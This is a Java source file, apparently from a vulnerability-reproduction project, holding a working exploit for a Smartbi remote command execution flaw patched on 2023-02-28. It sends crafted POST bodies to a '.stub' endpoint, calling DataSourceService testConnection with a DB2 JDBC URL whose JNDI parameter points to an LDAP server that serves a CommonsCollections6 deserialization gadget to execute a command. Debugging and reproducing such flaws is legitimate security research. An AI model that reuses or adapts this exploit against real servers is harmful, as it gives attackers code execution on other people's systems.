package cve;

import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
import org.apache.http.client.methods.HttpPost;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import smartbi.framework.rmi.RMIServlet;

/**
 * 漏洞：
 * https://www.smartbi.com.cn/patchinfo
 * 2023-02-28  修复了利用stub接口对"DB2 命令执行漏洞"补丁进行绕过的远程命令执行漏洞。
 *
 * 关键调试类和方法：
 * smartbi.framework.rmi.RMIServlet#doPost
 *
 */
public class PATCH_20230228 {

    public static void main(String[] args) throws IOException {

        String url = "http://10.58.120.201:18080/smartbi/any.stub";//any可换为任意字符
        // TODO 修改JNDI地址
        String jndiUrl = "ldap://10.58.120.201:1389/yqrrAVckti/CommonsCollections6/Exec/eyJjbWQiOiJjYWxjIn0=";
        String body1 = "className=DataSourceService&methodName=testConnection&params=[{\"password\":\"\",\"maxConnection\":100,\"user\":\"\",\"driverType\":\"MYSQL\",\"validationQuery\":\"SELECT CURRENT DATE FROM SYSIBM.SYSDUMMY1\",\"url\":\"jdbc:db2://127.0.0.1:50001/BLUDB:clientRerouteServerListJNDIName=" + jndiUrl + "\",\"name\":\"test\",\"driver\":\"com.ibm.db2.jcc.DB2Driver\",\"id\":\"\",\"desc\":\"\",\"alias\":\"\",\"dbCharset\":\"\",\"identifierQuoteString\":\"\",\"transactionIsolation\":-1,\"validationQueryMethod\":0,\"dbToCharset\":\"\",\"authenticationType\":\"STATIC\",\"driverCatalog\":null,\"extendProp\":\"{}\"}]";
        String body2 = "className=DataSourceService&methodName=testConnectionList&params=[[{\"password\":\"\",\"maxConnection\":100,\"user\":\"\",\"driverType\":\"MYSQL\",\"validationQuery\":\"SELECT CURRENT DATE FROM SYSIBM.SYSDUMMY1\",\"url\":\"jdbc:db2://127.0.0.1:50001/BLUDB:clientRerouteServerListJNDIName=" + jndiUrl + "\",\"name\":\"test\",\"driver\":\"com.ibm.db2.jcc.DB2Driver\",\"id\":\"\",\"desc\":\"\",\"alias\":\"\",\"dbCharset\":\"\",\"identifierQuoteString\":\"\",\"transactionIsolation\":-1,\"validationQueryMethod\":0,\"dbToCharset\":\"\",\"authenticationType\":\"STATIC\",\"driverCatalog\":null,\"extendProp\":\"{}\"}]]";
        HttpRequest httpRequest = new HttpRequest("127.0.0.1", 8080);
        HttpPost httpPost = new HttpPost(url);
        httpPost.addHeader("Content-Type","application/x-www-form-urlencoded");
        httpRequest.sendStringPost(httpPost,body1);
    }
}
